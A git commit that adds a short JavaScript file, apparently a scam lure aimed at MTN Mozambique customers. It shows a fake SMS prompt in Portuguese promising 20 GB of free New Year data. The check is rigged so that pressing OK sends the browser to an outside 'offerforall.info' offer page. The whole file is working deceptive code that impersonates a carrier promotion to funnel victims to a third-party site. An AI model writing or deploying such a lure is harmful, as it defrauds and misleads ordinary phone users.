478281c97c1cc9efefaf81fd602a4e1387dfd14f
harryjohnson86 <mfonjohnson86@gmail.com>
2025-01-09 14:35:37 -0800

    Create mtnmozambique.js

---
+++ mtnmozambique.js
@@ -0,0 +1,5 @@
+var password = '20 GB de dados gratuitos'
+password=prompt('SMS: Parabéns, seu número é elegível para receber RECOMPENSA de Ano Novo de 20 GB de dados gratuitos. Por favor, pressione OK para ATIVAR. ','10 GB de dados gratuitos');
+if (password != '20 GB de dados gratuitos') {
+location.href='https://offerforall.info/mtnmozambique.html';
+}
